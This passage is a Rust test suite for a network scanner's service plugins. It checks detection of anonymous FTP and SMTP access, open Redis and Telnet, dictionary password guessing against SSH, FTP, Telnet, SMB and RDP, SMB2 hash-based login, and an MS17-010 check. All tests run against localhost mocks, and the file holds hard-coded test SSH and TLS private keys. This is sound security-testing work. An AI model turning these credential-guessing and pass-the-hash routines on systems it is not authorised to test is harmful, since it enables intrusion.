use super::*;
use crate::connection::connect_stream_with;
use crate::protocols::cassandra::{cassandra_frame, cassandra_read_frame};
use crate::protocols::modbus::modbus_request_packet;
use crate::protocols::neo4j::{neo4j_chunk_message, neo4j_read_message};
use crate::protocols::postgres::postgres_read_message;
use crate::protocols::vnc::vnc_encrypt_challenge;
use rustls::pki_types::PrivateKeyDer;
use rustls::{ServerConfig, ServerConnection, StreamOwned};
use std::fs;
use std::io::{BufReader, ErrorKind};
use std::net::{TcpListener, TcpStream, UdpSocket};
use std::path::PathBuf;
use std::sync::{Arc, Mutex, OnceLock};
use std::thread;

const TEST_SSH_PRIVATE_KEY: &str = "-----BEGIN OPENSSH PRIVATE KEY-----\n\
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\n\
NhAAAAAwEAAQAAAQEApsV6z4Qb/kgByFhg/Ive9nyAL01i3FOhIeA9VCR+CofpDm3cV/3j\n\
nbKhDDHyD5/E4jsJ8YTXbvHCaCMUZ02/sFYEmqFiKhURZLz8W5gTi3q/EWFN6RF0Cxch/n\n\
4ayR/f0+wun8L4ZMvEfSLgNa8wqHu/pC0zMuWtam+fg95G6X2miTSa0e+HJUX216k77VuG\n\
/+GfqQg5oxva17qRoRbrxuzW1dCURULEiegDYGviCl4/3MhIxCxisi8wfKrNZcjWiEB1lc\n\
H7s8wlI0Qpafa9aGO7oEIe1kiN/LChhYSSDUcH69/+Kp5rbA6b5i9uJS4gJx/2J3yqiFzh\n\
B2Lnlvyw5QAAA9iRPt3bkT7d2wAAAAdzc2gtcnNhAAABAQCmxXrPhBv+SAHIWGD8i972fI\n\
AvTWLcU6Eh4D1UJH4Kh+kObdxX/eOdsqEMMfIPn8TiOwnxhNdu8cJoIxRnTb+wVgSaoWIq\n\
FRFkvPxbmBOLer8RYU3pEXQLFyH+fhrJH9/T7C6fwvhky8R9IuA1rzCoe7+kLTMy5a1qb5\n\
+D3kbpfaaJNJrR74clRfbXqTvtW4b/4Z+pCDmjG9rXupGhFuvG7NbV0JRFQsSJ6ANga+IK\n\
Xj/cyEjELGKyLzB8qs1lyNaIQHWVwfuzzCUjRClp9r1oY7ugQh7WSI38sKGFhJINRwfr3/\n\
4qnmtsDpvmL24lLiAnH/YnfKqIXOEHYueW/LDlAAAAAwEAAQAAAP9gACvLnnyg7H0rRfkX\n\
I49PVI8gRUE0k5pHiAmjoeaoGC4qKL5QtYlI8U9MRut/vaOP7J+iClZfwtyVJs+ghcMwpU\n\
J4r9RBQyO3jPCE/JcQd9P8rUJ48IqPk4WxRtVGnHB4DdsvYJ3PiknNWLUeurHqBqe50eTA\n\
tJg4tW83YCvHPA44lcA5BlnfWaw7uLOUyASQKh7kiOWSx/yHvaCwHFzxih2GIr3rmPWNq1\n\
ASAYVVqaxQD0dMCJVGpyY0D2/KgiQ2RE6/vk5LR9wMRjMR1vZN1kmQaObyHLeN/h1F2GMS\n\
Kslm81jplV88LUcWMWYs4NrrrAHUny2OcsOgWq1NeZMAAACBAL7PzjYTTn//2XYid5TBKZ\n\
kqcUNiH8UUOLVzyAKaCD39OIs+elOoAVOT9FYSdzqMFap8kAqmv+eBYZyEoX3Z40NcuzmC\n\
xpI9d5kDWundiOM4108Wb4rraj49TyJrvln22+2ep09Ms5LL0DFR3qmiYeGYjjNmSRRuMZ\n\
OS9HmUsf/gAAAAgQDZGY+MZmFwwOHiSanlVeKaPB9CrDrJI0picTPuziXeZusEH4mmSx1+\n\
EVCFnjCDMnMdaTb9KG8ENr8TwvHdorf1BeyCKmZ+aQrpCIKu43sPd8ipm1v8upvZEKdnVv\n\
wlUV2NAaJHXQ5JFcoClASYORU5uETWHrS78L/8Eys/JoRLlwAAAIEAxKdWWo1p//zLtdmS\n\
784MleMd4cf0T/E8QodPpBskCUkDobrDT9sZCPHpi0w++dgBPbWjfi1Z3Th+mkhTtMhuSK\n\
lIruPFIShEPVQjqWkOlpX8MVgOYNbM2d2K/URu9U4HfaHLYXTqB8i4VGs7xMeKSLNPo/8e\n\
T+lFmFTFlBLc5uMAAAAccm9vdEBpWjBqbDdlMTBycndsczk4dXhoZjdoWgECAwQFBgc=\n\
-----END OPENSSH PRIVATE KEY-----\n";
const TEST_TLS_CERT: &str = "-----BEGIN CERTIFICATE-----\n\
MIIDJTCCAg2gAwIBAgIUVsKefIIAEdhsupG7MpdeI4oOp+AwDQYJKoZIhvcNAQEL\n\
BQAwFDESMBAGA1UEAwwJbG9jYWxob3N0MB4XDTI2MDQyNDAxMTA0NloXDTI2MDQy\n\
NTAxMTA0NlowFDESMBAGA1UEAwwJbG9jYWxob3N0MIIBIjANBgkqhkiG9w0BAQEF\n\
AAOCAQ8AMIIBCgKCAQEA1b3LZDyq0OWkJIehkB15JDPenaRtJ85zNicdBQvGI5O4\n\
KNlYW/l/84rjp2EFMlB8zenT1HEqSe1K+P0UZqZ6+8QEY7EaHa+jw04ouuIF6cje\n\
OC2uPHYdPatjF5ayLZTL9Eyv2KMFJhYegxIdX3tkfCEHyN8ntIK6BhG1vBfh1e+P\n\
X2YRY+asTvxFeiiHggyCHPzO4qnd4aJWbTPbTsad8jDBaUBgOHbI7j3gBo0UZkwO\n\
QGcHsovCceGKcqfPDkFjfvBTXDMpA5NTAdYsThL2Lt5ylOQ/45IB4IvDmyZRBzrv\n\
GzF0xNUxKHptzdkJ5CtQbFW19Raon1Rx0nnYUGvQaQIDAQABo28wbTAdBgNVHQ4E\n\
FgQUBeJnXanldzZuzrp3p6PbDzxed64wHwYDVR0jBBgwFoAUBeJnXanldzZuzrp3\n\
p6PbDzxed64wDwYDVR0TAQH/BAUwAwEB/zAaBgNVHREEEzARgglsb2NhbGhvc3SH\n\
BH8AAAEwDQYJKoZIhvcNAQELBQADggEBADmYSfEQS/DIvwtKofg6VKGTe3UcVx1f\n\
f1XIQywqou5/dFG9cK/ChCWcIlIukmUHrhwbXQ0k/AzdFwjj1D2gBh8qxNXf/GQx\n\
cqx51ZiY+akmLd/lPkPFHCDL4tGl17boglGvW3T/u3FFfXXV8dQaJ9wNgetw7vUL\n\
VANxm+zndHkgzHgFAPuuIyq5iNWwnnWuB6CtR2FB2d+t40aa2D90Yysy8dMNCZfR\n\
BclVky6ChHmANe0JgMk7OApo2Pz7EBluXYFVrQMiGSwJbLlL8F7VyYXjLed76WU0\n\
a5J2UBJo0i+WVREmrnWhIuvCJIpBaqeaPG8KDsC8RHvBFbGUErV6gX0=\n\
-----END CERTIFICATE-----\n";
const TEST_TLS_KEY: &str = "-----BEGIN PRIVATE KEY-----\n\
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDVvctkPKrQ5aQk\n\
h6GQHXkkM96dpG0nznM2Jx0FC8Yjk7go2Vhb+X/ziuOnYQUyUHzN6dPUcSpJ7Ur4\n\
/RRmpnr7xARjsRodr6PDTii64gXpyN44La48dh09q2MXlrItlMv0TK/YowUmFh6D\n\
Eh1fe2R8IQfI3ye0groGEbW8F+HV749fZhFj5qxO/EV6KIeCDIIc/M7iqd3holZt\n\
M9tOxp3yMMFpQGA4dsjuPeAGjRRmTA5AZweyi8Jx4Ypyp88OQWN+8FNcMykDk1MB\n\
1ixOEvYu3nKU5D/jkgHgi8ObJlEHOu8bMXTE1TEoem3N2QnkK1BsVbX1FqifVHHS\n\
edhQa9BpAgMBAAECggEAARQhBtCm1XsKd2EXHaIocW+ZkxbPspIXmO6LasOluCWy\n\
gpUsBkCdtq9IkKQ3ylBNTgYrg0/Zy7D7xvb7oEhCy1lfKKmiItVOcJ+DFAQstgKW\n\
w8UVyl/0w0Zc3jM+HvI4YC2ZcHxvNgkVcw/hnPmO+1lhgTi6taghDDIQ3aB/C3GD\n\
IyprnMxIE/sc1LyVdZhGTF9X6I3xp+jQP7VJpX91wjffUac8G0+pzR1B2Rw6ZF7V\n\
Yu4EhU5dptp0tCbLlpzKvnD2/X01jwk8WffpgeN/oM2fYggl4UNkgl0aLYEwJFZo\n\
/XYuXl5QszOTmb2ZX9u17U1h9BlctkAvvH9/bqu3IQKBgQDxv53WbiRxyPZpvB5A\n\
UAeE52pDyyQLVI1xdktrSdPpp+BKDwg4CQqh3kffpAOa2s57IH+0tO5mnfG7w5SK\n\
CLhGqutAMkMey58bMMnPOW4lZvGgEqoH97p59mjLya+mb3P1k1fg3h2ep6uIo+yr\n\
P1nencHSyBQKMuTcA1ciBD7IXQKBgQDiV4EebrvHwr5wehhXPegUfjA7g5T/+1Za\n\
65XnCZSQXrmsWuqn+UazMndwIHj4utCEG7h2RqypRkW31ippOiiApB0EmRsjgIWm\n\
oSJxXDQtkwZu2mkC5aZO9tJ4Q2NgprCyIr0jux9QBv9kNu16FdWNK5N6clw0C3oC\n\
fa3QWBg3fQKBgQDcnaHNLnbT4DIADE0PI/m4r/eqJpiePmtWQD5Tiux5L1rgOxel\n\
C5tIXTH6RhOEHmqQsvfYUcW+oCUa1UGZNpv04cYOr8/RKsHobn29Pwvl1ixriJzi\n\
6JCk/NpmH4jMuql4Ux6/d/RP9XP1HqO9I/M/1Xgsg6rGI+v3XJUH1hf1gQKBgGps\n\
mJKVoIex4teCITXMLvaLyuQA36tpI1aG1SoYEBm94HHRIeqvQ/X4Mb6wFhFlzauA\n\
WUCLxJ2nJBrngXOO3AJ4qAhEcUVFJhKOS2Kf5wzSx8CRw7SQBJ22YooXrX+BgS2R\n\
Nfu5/WQklispxImWAJ5rMeHuKbpy9wB61aJT+bcFAoGAOXuAvfFH34syYitB/XG6\n\
xHJFz2k4twxhE3RZVYnWkzZ6duRrUEKfYYMn+nG+7vsZ4xJLzqO4Ua7NiBw32+Do\n\
t4jVJls3AqAt63f2EkL2jUjSpIyEB8jnLUTsdWE8UiBXGIV9YqvYiE3ekZylgV2d\n\
zSzfRta6NR6ILTdj7W2rfKU=\n\
-----END PRIVATE KEY-----\n";

fn tls_test_config() -> Arc<ServerConfig> {
    static CONFIG: OnceLock<Arc<ServerConfig>> = OnceLock::new();
    Arc::clone(CONFIG.get_or_init(|| {
        let mut cert_reader = BufReader::new(TEST_TLS_CERT.as_bytes());
        let certs = rustls_pemfile::certs(&mut cert_reader)
            .collect::<std::result::Result<Vec<_>, _>>()
            .expect("TLS cert should parse");
        let mut key_reader = BufReader::new(TEST_TLS_KEY.as_bytes());
        let key: PrivateKeyDer<'static> = rustls_pemfile::private_key(&mut key_reader)
            .expect("TLS key should parse")
            .expect("TLS key should exist");
        Arc::new(
            ServerConfig::builder_with_provider(
                rustls::crypto::aws_lc_rs::default_provider().into(),
            )
            .with_safe_default_protocol_versions()
            .expect("TLS protocol versions should be available")
            .with_no_client_auth()
            .with_single_cert(certs, key)
            .expect("TLS server config should build"),
        )
    }))
}

fn complete_server_tls_handshake(
    tls: &mut StreamOwned<ServerConnection, TcpStream>,
    deadline: Instant,
) -> bool {
    let connection_deadline = (Instant::now() + Duration::from_secs(1)).min(deadline);
    while Instant::now() < connection_deadline {
        match tls.conn.complete_io(&mut tls.sock) {
            Ok(_) if !tls.conn.is_handshaking() => {
                let _ = tls.sock.set_nonblocking(false);
                return true;
            }
            Ok(_) => {}
            Err(error)
                if matches!(
                    error.kind(),
                    ErrorKind::WouldBlock | ErrorKind::TimedOut | ErrorKind::Interrupted
                ) =>
            {
                if error.kind() != ErrorKind::Interrupted {
                    thread::sleep(Duration::from_millis(10));
                }
            }
            Err(_) => return false,
        }
    }
    false
}

struct TestSshHandler {
    username: String,
    password: Option<String>,
    authorized_key: Option<russh::keys::PublicKey>,
}

impl russh::server::Handler for TestSshHandler {
    type Error = russh::Error;

    fn auth_password(
        &mut self,
        user: &str,
        password: &str,
    ) -> impl std::future::Future<Output = std::result::Result<russh::server::Auth, Self::Error>> + Send
    {
        let accepted = self.username == user
            && self
                .password
                .as_deref()
                .is_some_and(|expected| expected == password);
        async move {
            Ok(if accepted {
                russh::server::Auth::Accept
            } else {
                russh::server::Auth::reject()
            })
        }
    }

    fn auth_publickey_offered(
        &mut self,
        user: &str,
        _public_key: &russh::keys::PublicKey,
    ) -> impl std::future::Future<Output = std::result::Result<russh::server::Auth, Self::Error>> + Send
    {
        let accepted = self.username == user && self.authorized_key.is_some();
        async move {
            Ok(if accepted {
                russh::server::Auth::Accept
            } else {
                russh::server::Auth::reject()
            })
        }
    }

    fn auth_publickey(
        &mut self,
        user: &str,
        _public_key: &russh::keys::PublicKey,
    ) -> impl std::future::Future<Output = std::result::Result<russh::server::Auth, Self::Error>> + Send
    {
        let accepted = self.username == user && self.authorized_key.is_some();
        async move {
            Ok(if accepted {
                russh::server::Auth::Accept
            } else {
                russh::server::Auth::reject()
            })
        }
    }

    async fn channel_open_session(
        &mut self,
        _channel: russh::Channel<russh::server::Msg>,
        _session: &mut russh::server::Session,
    ) -> std::result::Result<bool, Self::Error> {
        Ok(true)
    }
}

#[test]
fn detects_ftp_anonymous_login() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();

    let server = thread::spawn(move || {
        let (mut stream, _) = listener.accept().expect("request should arrive");
        stream
            .write_all(b"220 FTP ready\r\n")
            .expect("banner should write");
        let mut buffer = [0u8; 1024];
        let count = stream.read(&mut buffer).expect("user should read");
        assert!(String::from_utf8_lossy(&buffer[..count]).contains("USER anonymous"));
        stream
            .write_all(b"230 Login successful\r\n")
            .expect("login should write");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "ftp",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "ftp");
    assert_eq!(findings[0].status, "anonymous-login");
    assert_eq!(findings[0].details["username"], json!("anonymous"));
}

#[test]
fn skips_ms17010_when_brute_force_disabled() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();
    drop(listener);

    let runtime = ServiceRuntimeBundle {
        auth: AuthRuntimeOptions {
            disable_brute: true,
            ..AuthRuntimeOptions::default()
        },
        ..ServiceRuntimeBundle::default()
    };
    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "ms17010",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 1,
            ssh_key_path: None,
        },
        &runtime,
    )
    .expect("scan should succeed");

    assert!(findings.is_empty());
}

#[test]
fn keeps_redis_unauthorized_when_brute_force_disabled() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();

    let server = thread::spawn(move || {
        let (mut stream, _) = listener.accept().expect("request should arrive");
        let mut buffer = [0u8; 128];
        let count = stream.read(&mut buffer).expect("request should read");
        assert!(String::from_utf8_lossy(&buffer[..count]).contains("INFO"));
        stream
            .write_all(b"$12\r\nredis_version\r\n")
            .expect("response should write");
    });

    let runtime = ServiceRuntimeBundle {
        auth: AuthRuntimeOptions {
            disable_brute: true,
            ..AuthRuntimeOptions::default()
        },
        ..ServiceRuntimeBundle::default()
    };
    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "redis",
        &PluginContext {
            usernames: Vec::new(),
            passwords: vec!["123456".to_string()],
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &runtime,
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "redis");
    assert_eq!(findings[0].status, "unauthorized");
}

#[test]
fn detects_smb_weak_password_with_domain_runtime_options() {
    set_auth_runtime_options(AuthRuntimeOptions {
        domain: Some("CORP".to_string()),
        hashes: Vec::new(),
        disable_brute: false,
    });

    let mut attempts = Vec::new();
    let finding = scan_smb_with(
        &OpenService {
            host: "127.0.0.1".to_string(),
            port: 445,
        },
        &PluginContext {
            usernames: vec!["administrator".to_string()],
            passwords: vec!["{user}@123".to_string()],
            timeout_secs: 2,
            ssh_key_path: None,
        },
        |_, username, password, domain, _| {
            attempts.push((
                username.to_string(),
                password.to_string(),
                domain.to_string(),
            ));
            Ok(username == "administrator" && password == "administrator@123" && domain == "CORP")
        },
    )
    .expect("scan should succeed")
    .expect("smb finding should exist");

    set_auth_runtime_options(AuthRuntimeOptions::default());

    assert_eq!(
        attempts,
        vec![(
            "administrator".to_string(),
            "administrator@123".to_string(),
            "CORP".to_string()
        )]
    );
    assert_eq!(finding.plugin, "smb");
    assert_eq!(finding.status, "weak-password");
    assert_eq!(finding.details["service"], json!("smb"));
    assert_eq!(finding.details["username"], json!("administrator"));
    assert_eq!(finding.details["password"], json!("administrator@123"));
    assert_eq!(finding.details["domain"], json!("CORP"));
}

#[test]
fn uses_smb_default_dictionary_order() {
    let mut attempts = Vec::new();
    let finding = scan_smb_with(
        &OpenService {
            host: "127.0.0.1".to_string(),
            port: 445,
        },
        &PluginContext {
            usernames: Vec::new(),
            passwords: vec!["123456".to_string()],
            timeout_secs: 2,
            ssh_key_path: None,
        },
        |_, username, password, domain, _| {
            attempts.push((
                username.to_string(),
                password.to_string(),
                domain.to_string(),
            ));
            Ok(username == "administrator" && password == "123456" && domain.is_empty())
        },
    )
    .expect("scan should succeed")
    .expect("smb finding should exist");

    assert_eq!(
        attempts.first(),
        Some(&(
            "administrator".to_string(),
            "123456".to_string(),
            String::new()
        ))
    );
    assert_eq!(finding.details["username"], json!("administrator"));
    assert_eq!(finding.details["password"], json!("123456"));
}

#[test]
fn detects_smb2_hash_auth_with_domain_runtime_options() {
    set_auth_runtime_options(AuthRuntimeOptions {
        domain: Some("CORP".to_string()),
        hashes: vec!["0123456789abcdef0123456789abcdef".to_string()],
        disable_brute: false,
    });

    let mut attempts = Vec::new();
    let finding = scan_smb2_with(
        &OpenService {
            host: "127.0.0.1".to_string(),
            port: 445,
        },
        &PluginContext {
            usernames: vec!["administrator".to_string()],
            passwords: vec!["ignored".to_string()],
            timeout_secs: 2,
            ssh_key_path: None,
        },
        |_, username, credential, domain, auth_mode, _| {
            attempts.push((
                username.to_string(),
                credential.to_string(),
                domain.to_string(),
                auth_mode,
            ));
            Ok((username == "administrator"
                && credential == "0123456789abcdef0123456789abcdef"
                && domain == "CORP"
                && auth_mode == Smb2AuthMode::Hash)
                .then(|| vec!["C$".to_string(), "IPC$".to_string()]))
        },
    )
    .expect("scan should succeed")
    .expect("smb2 finding should exist");

    set_auth_runtime_options(AuthRuntimeOptions::default());

    assert_eq!(
        attempts,
        vec![(
            "administrator".to_string(),
            "0123456789abcdef0123456789abcdef".to_string(),
            "CORP".to_string(),
            Smb2AuthMode::Hash
        )]
    );
    assert_eq!(finding.plugin, "smb2");
    assert_eq!(finding.status, "weak-auth");
    assert_eq!(finding.details["service"], json!("smb2"));
    assert_eq!(finding.details["username"], json!("administrator"));
    assert_eq!(
        finding.details["credential"],
        json!("0123456789abcdef0123456789abcdef")
    );
    assert_eq!(finding.details["auth_type"], json!("hash"));
    assert_eq!(finding.details["domain"], json!("CORP"));
    assert_eq!(finding.details["shares"], json!(vec!["C$", "IPC$"]));
}

#[test]
fn uses_smb2_password_dictionary_when_hashes_absent() {
    set_auth_runtime_options(AuthRuntimeOptions::default());

    let mut attempts = Vec::new();
    let finding = scan_smb2_with(
        &OpenService {
            host: "127.0.0.1".to_string(),
            port: 445,
        },
        &PluginContext {
            usernames: Vec::new(),
            passwords: vec!["123456".to_string()],
            timeout_secs: 2,
            ssh_key_path: None,
        },
        |_, username, credential, domain, auth_mode, _| {
            attempts.push((
                username.to_string(),
                credential.to_string(),
                domain.to_string(),
                auth_mode,
            ));
            Ok((username == "administrator"
                && credential == "123456"
                && domain.is_empty()
                && auth_mode == Smb2AuthMode::Password)
                .then(Vec::new))
        },
    )
    .expect("scan should succeed")
    .expect("smb2 finding should exist");

    assert_eq!(
        attempts.first(),
        Some(&(
            "administrator".to_string(),
            "123456".to_string(),
            String::new(),
            Smb2AuthMode::Password
        ))
    );
    assert_eq!(finding.details["credential"], json!("123456"));
    assert_eq!(finding.details["auth_type"], json!("password"));
}

#[test]
fn detects_rdp_weak_password_with_domain_runtime_options() {
    set_auth_runtime_options(AuthRuntimeOptions {
        domain: Some("CORP".to_string()),
        hashes: Vec::new(),
        disable_brute: false,
    });

    let mut attempts = Vec::new();
    let finding = scan_rdp_with(
        &OpenService {
            host: "127.0.0.1".to_string(),
            port: 3389,
        },
        &PluginContext {
            usernames: vec!["administrator".to_string()],
            passwords: vec!["123456".to_string()],
            timeout_secs: 2,
            ssh_key_path: None,
        },
        |_, username, password, domain, _| {
            attempts.push((
                username.to_string(),
                password.to_string(),
                domain.to_string(),
            ));
            Ok(username == "administrator" && password == "123456" && domain == "CORP")
        },
    )
    .expect("scan should succeed")
    .expect("rdp finding should exist");

    set_auth_runtime_options(AuthRuntimeOptions::default());

    assert_eq!(
        attempts,
        vec![(
            "administrator".to_string(),
            "123456".to_string(),
            "CORP".to_string()
        )]
    );
    assert_eq!(finding.plugin, "rdp");
    assert_eq!(finding.status, "weak-password");
    assert_eq!(finding.details["service"], json!("rdp"));
    assert_eq!(finding.details["username"], json!("administrator"));
    assert_eq!(finding.details["password"], json!("123456"));
    assert_eq!(finding.details["domain"], json!("CORP"));
}

#[test]
fn uses_rdp_default_dictionary_order() {
    let mut attempts = Vec::new();
    let finding = scan_rdp_with(
        &OpenService {
            host: "127.0.0.1".to_string(),
            port: 3389,
        },
        &PluginContext {
            usernames: Vec::new(),
            passwords: vec!["123456".to_string()],
            timeout_secs: 2,
            ssh_key_path: None,
        },
        |_, username, password, domain, _| {
            attempts.push((
                username.to_string(),
                password.to_string(),
                domain.to_string(),
            ));
            Ok(username == "administrator" && password == "123456" && domain.is_empty())
        },
    )
    .expect("scan should succeed")
    .expect("rdp finding should exist");

    assert_eq!(
        attempts.first(),
        Some(&(
            "administrator".to_string(),
            "123456".to_string(),
            String::new()
        ))
    );
    assert_eq!(finding.details["username"], json!("administrator"));
    assert_eq!(finding.details["password"], json!("123456"));
}

#[test]
fn matches_go_registry_ports_for_expanded_service_plugins() {
    let ports_by_plugin = registered_plugins()
        .into_iter()
        .map(|plugin| (plugin.key, plugin.ports.to_vec()))
        .collect::<BTreeMap<_, _>>();

    assert_eq!(ports_by_plugin["ssh"], vec![22, 2222]);
    assert_eq!(ports_by_plugin["rdp"], vec![3389, 13389, 33389]);
    assert_eq!(ports_by_plugin["mongodb"], vec![27017, 27018]);
    assert_eq!(ports_by_plugin["kafka"], vec![9092, 9093]);
    assert_eq!(ports_by_plugin["mssql"], vec![1433, 1434]);
    assert_eq!(ports_by_plugin["oracle"], vec![1521, 1522, 1526]);
    assert_eq!(ports_by_plugin["mysql"], vec![3306, 3307, 13306, 33306]);
    assert_eq!(ports_by_plugin["postgres"], vec![5432, 5433]);
}

#[test]
fn detects_ssh_weak_password() {
    let (port, server) = spawn_ssh_server(1, "root", Some("123456"), false);

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "ssh",
        &PluginContext {
            usernames: vec!["root".to_string()],
            passwords: vec!["123456".to_string()],
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "ssh");
    assert_eq!(findings[0].status, "vulnerable");
    assert_eq!(findings[0].details["service"], json!("ssh"));
    assert_eq!(findings[0].details["username"], json!("root"));
    assert_eq!(findings[0].details["password"], json!("123456"));
    assert_eq!(findings[0].details["auth_type"], json!("password"));
}

#[test]
fn detects_ssh_key_authentication() {
    let (port, server) = spawn_ssh_server(1, "root", None, true);
    let key_path = write_test_ssh_key("ssh-plugin");

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "ssh",
        &PluginContext {
            usernames: vec!["root".to_string()],
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: Some(key_path.clone()),
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");
    let _ = fs::remove_file(&key_path);

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "ssh");
    assert_eq!(findings[0].status, "vulnerable");
    assert_eq!(findings[0].details["service"], json!("ssh"));
    assert_eq!(findings[0].details["username"], json!("root"));
    assert_eq!(findings[0].details["auth_type"], json!("key"));
}

#[test]
fn detects_ftp_weak_password_with_default_dictionary() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();

    let server = thread::spawn(move || {
        let (mut anonymous_stream, _) = listener.accept().expect("anonymous request should arrive");
        anonymous_stream
            .write_all(b"220 FTP ready\r\n")
            .expect("banner should write");
        let mut buffer = [0u8; 1024];
        let count = anonymous_stream
            .read(&mut buffer)
            .expect("user should read");
        assert!(String::from_utf8_lossy(&buffer[..count]).contains("USER anonymous"));
        anonymous_stream
            .write_all(b"331 Need password\r\n")
            .expect("need password should write");
        let count = anonymous_stream
            .read(&mut buffer)
            .expect("password should read");
        assert!(String::from_utf8_lossy(&buffer[..count]).contains("PASS "));
        anonymous_stream
            .write_all(b"530 Login incorrect\r\n")
            .expect("failure should write");

        let (mut weak_stream, _) = listener
            .accept()
            .expect("weak password request should arrive");
        weak_stream
            .write_all(b"220 FTP ready\r\n")
            .expect("banner should write");
        let count = weak_stream.read(&mut buffer).expect("user should read");
        assert!(String::from_utf8_lossy(&buffer[..count]).contains("USER ftp"));
        weak_stream
            .write_all(b"331 Need password\r\n")
            .expect("need password should write");
        let count = weak_stream.read(&mut buffer).expect("password should read");
        assert!(String::from_utf8_lossy(&buffer[..count]).contains("PASS 123456"));
        weak_stream
            .write_all(b"230 Login successful\r\n")
            .expect("success should write");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "ftp",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "ftp");
    assert_eq!(findings[0].status, "weak-password");
    assert_eq!(findings[0].details["username"], json!("ftp"));
    assert_eq!(findings[0].details["password"], json!("123456"));
}

#[test]
fn detects_telnet_unauthorized_access() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();

    let server = thread::spawn(move || {
        let (mut stream, _) = listener.accept().expect("request should arrive");
        stream
            .write_all(b"Welcome to telnet\r\n# ")
            .expect("banner should write");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "telnet",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "telnet");
    assert_eq!(findings[0].status, "unauthorized-access");
}

#[test]
fn detects_telnet_weak_password_with_default_dictionary() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();

    let server = thread::spawn(move || {
        let (mut probe_stream, _) = listener.accept().expect("probe request should arrive");
        probe_stream
            .write_all(b"login: ")
            .expect("probe banner should write");

        let (mut auth_stream, _) = listener.accept().expect("auth request should arrive");
        auth_stream
            .write_all(b"login: ")
            .expect("banner should write");
        let mut buffer = [0u8; 1024];
        let count = auth_stream.read(&mut buffer).expect("username should read");
        assert!(String::from_utf8_lossy(&buffer[..count]).contains("root"));
        auth_stream
            .write_all(b"Password: ")
            .expect("password prompt should write");
        let count = auth_stream.read(&mut buffer).expect("password should read");
        assert!(String::from_utf8_lossy(&buffer[..count]).contains("123456"));
        auth_stream
            .write_all(b"Welcome\r\n$ ")
            .expect("success should write");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "telnet",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        },
        &ServiceRuntimeBundle::default(),
    )
    .expect("scan should succeed");

    server.join().expect("server should finish");

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].plugin, "telnet");
    assert_eq!(findings[0].status, "weak-password");
    assert_eq!(findings[0].details["username"], json!("root"));
    assert_eq!(findings[0].details["password"], json!("123456"));
}

#[test]
fn detects_smtp_anonymous_access() {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let port = listener.local_addr().expect("local addr").port();

    let server = thread::spawn(move || {
        let (mut stream, _) = listener.accept().expect("request should arrive");
        stream
            .write_all(b"220 mail.example ESMTP ready\r\n")
            .expect("banner should write");
        let mut buffer = [0u8; 1024];

        let size = stream.read(&mut buffer).expect("ehlo should read");
        assert!(String::from_utf8_lossy(&buffer[..size]).contains("EHLO rscan"));
        stream
            .write_all(b"250-mail.example\r\n250 AUTH PLAIN\r\n")
            .expect("ehlo response should write");

        let size = stream.read(&mut buffer).expect("mail should read");
        assert!(String::from_utf8_lossy(&buffer[..size]).contains("MAIL FROM"));
        stream
            .write_all(b"250 Sender OK\r\n")
            .expect("mail response should write");
    });

    let findings = scan_services(
        &[OpenService {
            host: "127.0.0.1".to_string(),
            port,
        }],
        "smtp",
        &PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
